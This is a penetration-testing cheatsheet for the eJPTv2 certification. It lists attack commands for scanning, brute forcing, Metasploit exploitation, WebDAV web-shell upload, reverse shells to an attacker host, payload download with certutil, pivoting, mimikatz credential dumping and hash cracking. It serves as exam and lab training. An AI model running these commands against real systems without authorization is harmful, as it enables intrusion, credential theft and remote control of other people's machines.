# eJPTv2 — One-Page Quick Cheatsheet

**Dr. Mohammed Tawfik** · Print and keep beside your monitor.

---

## RECON (always start here)
```bash
ip -br a                                    # know your interfaces
nmap -sn 10.0.0.0/24                        # host discovery
nmap -Pn demo.ine.local                     # if ICMP blocked
nmap -sS -p- --min-rate 1000 <target>       # full TCP
nmap -sV -sC -p<ports> <target>             # versions + scripts
nmap -sU --top-ports 100 <target>           # UDP
```

## SMB (139/445) — most common
```bash
enum4linux -a <target>
smbclient -L //<target> -N
rpcclient -U "" -N <target>     → netshareenumall ; enumdomusers
smbmap -H <target> -u user -p pass
# Brute (NOT hydra — use MSF):
msfconsole -q -x "use auxiliary/scanner/smb/smb_login; set RHOSTS <t>; set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt; set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt; set VERBOSE false; run; exit"
# Shell:
use exploit/windows/smb/psexec → set SMBUser/SMBPass → exploit
use exploit/multi/samba/usermap_script    # Samba 3.0.20
```

## HTTP (80)
```bash
curl -X OPTIONS http://<t>/ -v              # look for DAV: / PUT
gobuster dir -u http://<t> -w /usr/share/wordlists/dirb/common.txt
# WebDAV:
davtest -auth user:pass -url http://<t>/webdav
curl -u user:pass -T shell.asp http://<t>/webdav/shell.asp
curl -u user:pass -G --data-urlencode "cmd=type C:\flag.txt" http://<t>/webdav/shell.asp
# HFS 2.3:
use exploit/windows/http/rejetto_hfs_exec
```

## FTP (21 / odd port)
```bash
ftp <target>                                # anonymous/anonymous
hydra -L users -P pass -s <port> ftp://<target>
use exploit/unix/ftp/vsftpd_234_backdoor
```

## SSH (22)
```bash
hydra -l root -P rockyou.txt ssh://<target> -t 4
use auxiliary/scanner/ssh/ssh_login         # brute
use auxiliary/scanner/ssh/libssh_auth_bypass ; set SPAWN_PTY true   # CVE-2018-10933
```

## RDP (3389 / odd port like 3333)
```bash
use auxiliary/scanner/rdp/rdp_scanner ; set RPORT 3333
hydra -L users -P pass rdp://<target> -s 3333
xfreerdp /u:administrator /p:pass /v:<target>:3333 /cert:ignore
```

## WinRM (5985)
```bash
use auxiliary/scanner/winrm/winrm_login
use exploit/windows/winrm/winrm_script_exec ; set FORCE_VBS true
evil-winrm -i <target> -u user -p pass
```

## SNMP (161/udp) · SMTP (25) · MySQL (3306)
```bash
snmpwalk -v 2c -c public <target>
nc <target> 25 → VRFY user@domain           # 252=exists
use auxiliary/scanner/mysql/mysql_login ; set USERNAME root
```

## SHELLS
```bash
nc -nvlp 1234                               # listener
nc.exe -nv <kali> 1234 -e cmd.exe           # win reverse
bash -i >& /dev/tcp/<kali>/1234 0>&1        # linux reverse
# upgrade: python -c 'import pty;pty.spawn("/bin/bash")' ; Ctrl+Z ; stty raw -echo; fg
certutil -urlcache -f http://<kali>/nc.exe nc.exe   # win download
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f exe > b.exe
```

## PIVOTING
```bash
run autoroute -s 192.168.X.0/24             # in meterpreter
use auxiliary/scanner/portscan/tcp ; set RHOSTS <2nd_target>
use auxiliary/server/socks_proxy ; set VERSION 4a ; set SRVPORT 9050 ; run -j
# /etc/proxychains4.conf → socks4 127.0.0.1 9050
proxychains nmap -sT -Pn <2nd_target>
portfwd add -l 8080 -p 80 -r <2nd_target>
```

## WINDOWS PRIVESC
```bash
getsystem                                   # try first
load incognito → list_tokens -u → impersonate_token DOMAIN\\Admin
Akagi64.exe 23 <payload.exe>                # UACMe
cat C:\Windows\Panther\Unattend.xml         # creds in answer file
load kiwi → creds_all → lsa_dump_sam        # mimikatz
hashdump
```

## LINUX PRIVESC
```bash
sudo -l                                     # → GTFOBins
find / -perm -4000 2>/dev/null              # SUID
getcap -r / 2>/dev/null                     # capabilities
./linpeas.sh
```

## CRACKING
```bash
hashid '<hash>'
hashcat -m 0 hash rockyou.txt               # 0=MD5 1000=NTLM 1800=sha512crypt 5600=NetNTLMv2
john --format=NT ntlm.txt --wordlist=rockyou.txt
unshadow passwd shadow > c.txt ; john c.txt --wordlist=rockyou.txt
```

## WORDLISTS
```bash
/usr/share/metasploit-framework/data/wordlists/{common_users,unix_passwords,unix_users}.txt
gunzip /usr/share/wordlists/rockyou.txt.gz
/root/Desktop/wordlists/                    # lab-provided (ls first!)
```

---
## REMEMBER
- ICMP blocked → `-Pn` · Hydra fails SMB → use MSF `smb_login`
- Old ASP shells break → write custom 10-line shell
- Odd ports hide services → always `-p-`
- Flag = MD5 usually, but sometimes a fact (port#, username)
- autoroute > SOCKS for stability · `/etc/hosts` if site unreachable
- Default creds first · 30-min rabbit-hole cap · read the question
